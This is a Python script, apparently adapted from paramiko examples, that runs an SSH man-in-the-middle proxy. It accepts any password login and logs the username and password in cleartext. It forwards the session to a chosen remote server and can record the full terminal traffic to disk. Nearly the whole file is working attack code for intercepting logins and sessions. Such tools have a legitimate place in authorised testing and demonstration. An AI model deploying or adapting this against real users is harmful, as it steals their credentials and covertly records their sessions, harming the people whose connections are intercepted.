#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Major part of this file is part of paramiko examples.

import base64
from binascii import hexlify
import os
import socket
import select
import sys
import threading
import traceback
import argparse
import datetime
import json
import time

import paramiko
from paramiko.py3compat import b, u, decodebytes


def info(msg):
    print("[\033[34;1mi\033[0m] %s" % (msg))


def ok(msg):
    print("[\033[32;1m+\033[0m] %s" % (msg))


def warn(msg):
    print("[\033[33;1mw\033[0m] %s" % (msg))


def error(msg):
    print("[\033[31;1m!\033[0m] %s" % (msg))

host_key = paramiko.RSAKey(filename='test_rsa.key')

info('Read key: ' + u(hexlify(host_key.get_fingerprint())))


class Server (paramiko.ServerInterface):
    # 'data' is the output of base64.encodestring(str(key))
    # (using the "user_rsa_key" files)
    # TODO: use key provided by user
    data = (b'AAAAB3NzaC1yc2EAAAABIwAAAIEAyO4it3fHlmGZWJaGrfeHOVY7RWO3P9M7hp'
            b'fAu7jJ2d7eothvfeuoRFtJwhUmZDluRdFyhFY/hFAh76PJKGAusIqIQKlkJxMC'
            b'KDqIexkgHAfID/6mqvmnSJf0b5W8v5h2pI/stOSwTQ+pxVhwJ9ctYDhRSlF0iT'
            b'UWT10hcuO4Ks8=')
    good_pub_key = paramiko.RSAKey(data=decodebytes(data))

    def __init__(self):
        self.command = b''
        self.username = ''
        self.password = ''
        self.term = "xterm-256color"
        self.width = 80
        self.height = 20
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        ok('Auth attempt with user:' + username + " password:"+password)
        self.username = username
        self.password = password
        return paramiko.AUTH_SUCCESSFUL

    def check_auth_publickey(self, username, key):
        return paramiko.AUTH_FAILED

    def enable_auth_gssapi(self):
        return False

    def get_allowed_auths(self, username):
        return 'password'

    def check_channel_exec_request(self, channel, command):
        ok('Client request command : ' + command.decode("utf-8"))
        self.command = command
        return True

    def check_channel_shell_request(self, channel):
        ok('Client request shell')
        self.event.set()
        return True

    def check_channel_pty_request(self, channel, term, width, height, pixelwidth, pixelheight, modes):
        ok('Client request pty')
        self.term = term
        self.width = width
        self.height = height
        return True

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument(
        '--alert-user',
        dest='alerting',
        help='Alert user that their connection have been intercepted',
        nargs='?',
        const=1,
        default=0
    )
    parser.add_argument(
        '--group-exchange-key',
        dest='gex',
        help='Activate group-exchange key negotiation in server mode (difficult to compute)',
        nargs='?',
        const=1,
        default=0
    )
    parser.add_argument(
        '--remote-server',
        required=True,
        dest='remote_server',
        help='remote server to proxify connections'
    )
    parser.add_argument(
        '--remote-port',
        dest='remote_port',
        help='remote port to proxify connection',
        type=int,
        default=22
    )
    parser.add_argument(
        '--listen-port',
        dest='listen_port',
        help='listen port',
        type=int,
        default=22
    )
    parser.add_argument(
        '--listen-addr',
        dest='listen_addr',
        help='listen addr',
        default=''
    )
    parser.add_argument(
        '--asciinema-json-dir',
        dest='asciinema',
        help='Directory to save SSH server pty as asciinema json',
        default=0
    )
    args = parser.parse_args()

    asciinema_data = ""

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((args.listen_addr, args.listen_port))
    except Exception as e:
        error('*** Bind failed: ' + str(e))
        traceback.print_exc()
        sys.exit(1)


    class TunnelThread(threading.Thread):

        def __init__(self, ip, port, socket):
            threading.Thread.__init__(self)
            self.ip = ip
            self.port = port
            self.socket = socket


        def run(self):
            info('Got a connection from %s:%d' % (self.ip, self.port))

            client_log_f = ''
            server_log_f = ''
            path = ''

            try:
                t = paramiko.Transport(self.socket, gss_kex=False)
                if args.gex:
                    try:
                        t.load_server_moduli()
                    except:
                        error('(Failed to load moduli -- gex will be unsupported.)')
                        raise
                t.add_server_key(host_key)
                server = Server()
                try:
                    t.start_server(server=server)
                except paramiko.SSHException:
                    error('*** SSH negotiation failed.')
                    t.close()
                    return

                # wait for auth
                client_chan = t.accept(20)
                if client_chan is None:
                    error('*** No channel.')
                    t.close()
                    return
                ok('Received Authentication!')

                if args.alerting:
                    client_chan.send(
                        '\r\n\033[31;1mThis connection has been intercepted\033[0m\r\n')

                start_time = datetime.datetime.now()
                last_time = start_time
                delta = ""

                server_ssh = paramiko.SSHClient()
                server_ssh.load_system_host_keys()
                server_ssh.set_missing_host_key_policy(paramiko.WarningPolicy())
                try:
                    server_ssh.set_missing_host_key_policy(paramiko.client.AutoAddPolicy())
                    server_ssh.connect(
                        args.remote_server, args.remote_port, server.username, server.password)
                except paramiko.AuthenticationException as e:
                    client_chan.send("authentification failed\r\n")
                    client_chan.close()
                    return

                if args.asciinema:
                    now = datetime.datetime.now()
                    path = "%s/%04d-%02d-%02dH%02d:%02d:%02d.%06d_%s-%d" % (
                        args.asciinema, now.year, now.month, now.day, now.hour, now.minute, now.second, now.microsecond, self.ip, self.port)

                    ok("asciinema session saved : %s" % (path))
                    if not os.path.exists(path):
                        os.makedirs(path)

                    asciinema_data_hdr = '{\n'
                    asciinema_data_hdr += '  "version": 1,\n'

                    if server.command == b'':
                        asciinema_data_hdr += '  "command": "$SHELL",\n'
                        asciinema_data_hdr += '  "width": %d,\n' % (server.width)
                        asciinema_data_hdr += '  "height": %d,\n' % (server.height)
                    else:
                        asciinema_data_hdr += '  "command": %s,\n' % (json.dumps(server.command.decode("utf-8")))

                    asciinema_data_hdr += '}\n'

                    filename = path + "/data.json"
                    f = open(filename, "w")
                    f.write(asciinema_data_hdr)
                    f.close()
                    client_log_f = open(path + "/client.raw", "wb")
                    server_log_f = open(path + "/server.raw", "wb")

                server_chan = ''
                if server.command != b'':
                    server_chan = server_ssh.get_transport().open_session()
                    server_chan.exec_command(server.command)
                else:
                    server_chan = server_ssh.invoke_shell()

                #Max 1 min Iddle
                server_chan.settimeout(60.0)
                client_chan.settimeout(60.0)

                while True:
                    r, w, e = select.select([server_chan, client_chan], [], [])
                    if client_chan in r:
                        x = client_chan.recv(1024)
                        client_log_f.write(x)
                        x = u(x)
                        if len(x) == 0:
                            break
                        server_chan.send(x)
                    if server_chan in r:
                        x = server_chan.recv(1024)
                        server_log_f.write(x)
                        x = u(x)
                        if len(x) == 0:
                            break
                        client_chan.send(x)

                server_chan.close()
                client_chan.close()
                t.close()
                if args.asciinema:
                    client_log_f.close()
                    server_log_f.close()
                ok('Connection Closed!')
            except Exception as e:
                error('*** Caught exception: ' + str(e.__class__) + ': ' + str(e))
                traceback.print_exc()
                try:
                    t.close()
                except:
                    pass

    try:
        sock.listen(10)
    except Exception as e:
        error('*** Listen failed: ' + str(e))
        traceback.print_exc()
        sys.exit(1)

    threads = []
    info('Listening for new connection ...')
    while True:
        try:
            client, addr = sock.accept()
            newthread = TunnelThread(addr[0], int(addr[1]), client)
            newthread.start()
            threads.append(newthread)
        except Exception as e:
            error('*** accept failed: ' + str(e))
            traceback.print_exc()
            sys.exit(1)

    for t in threads:
        t.join()
